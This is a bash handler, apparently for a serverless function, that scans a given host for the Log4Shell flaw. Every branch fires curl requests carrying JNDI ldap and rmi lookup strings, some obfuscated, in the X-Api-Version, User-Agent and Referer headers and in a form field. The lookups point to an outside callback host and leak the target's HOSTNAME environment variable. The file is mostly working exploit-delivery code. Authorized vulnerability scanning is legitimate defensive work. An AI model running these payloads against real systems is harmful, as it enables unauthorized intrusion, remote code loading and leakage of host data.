#!/bin/bash

function handler () {
    # FQDN=`echo $1 | jq -r ".FQDN"`
    FQDN=`echo $1 | sed -e 's/^.*"FQDN":"\([^"]*\)".*$/\1/'`
    TARGET=`echo $FQDN | sed -e "s|^https://||g" | sed -e "s|^http://||g" | sed -e "s|:.*$||g" | sed -e "s|/.*$||g"`
    REQUEST_UNIXTIME=`date +%s`

    echo "start $FQDN"

    # call scan
    if [[ $FQDN == "http"* ]]
    then
        URL=$FQDN
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g" | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g" | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"          | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"    | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}}'|g"                  | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"             | sed "s|\$1|$URL|g" | bash
    else 
        # http
        URL=http://$FQDN
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g" | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g" | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"          | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"    | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}}'|g"                  | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"             | sed "s|\$1|$URL|g" | bash

        # https
        URL=https://$FQDN
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g" | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g" | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"          | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"    | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${jndi:ldap://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}}'|g"                  | sed "s|\$1|$URL|g" | bash
        echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$LDAP/log4shell/$TARGET/$REQUEST_UNIXTIME/\${env:HOSTNAME}}'|g"             | sed "s|\$1|$URL|g" | bash
    fi

    RESPONSE="{\"statusCode\": 200, \"body\": \"EVENT_DATA=$FQDN\"}"
    echo $RESPONSE
}
